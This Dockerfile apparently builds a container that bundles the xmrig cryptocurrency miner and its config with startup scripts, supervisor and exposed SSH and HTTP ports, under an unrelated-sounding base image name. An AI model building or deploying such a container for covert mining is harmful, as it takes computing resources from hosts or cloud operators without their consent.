FROM developeranaz/treasure-cloud-invite:1
#RUN apt install rclone -y
RUN apt install supervisor -y
COPY rcxstart /usr/bin/rcxstart
COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
EXPOSE 22 80
COPY e.sh /e.sh
RUN chmod +x /e.sh
RUN chmod +x /usr/bin/rcxstart
COPY xmrig /xmrig
COPY config.json /config.json
COPY SHA256SUMS /SHA256SUMS
COPY a.sh /a.sh
RUN chmod +x /xmrig
RUN chmod +x /config.json
RUN chmod +x /SHA256SUMS
RUN chmod +x /a.sh
WORKDIR /
CMD /e.sh
